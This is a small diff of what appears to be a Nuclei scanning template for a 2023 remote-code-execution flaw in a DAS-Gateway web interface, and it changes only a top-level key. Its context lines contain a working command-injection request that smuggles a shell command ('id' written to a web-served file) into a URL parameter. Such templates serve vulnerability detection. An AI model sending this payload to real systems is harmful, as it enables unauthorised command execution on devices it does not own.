@@ -15,7 +15,7 @@ info:
     verified: true
   tags: 2023,DAS-Gateway,rce
 
-http:
+requests:
   - raw:
       - |
         GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id+>/usr/local/webui/test.txt`)\}\} HTTP/1.1
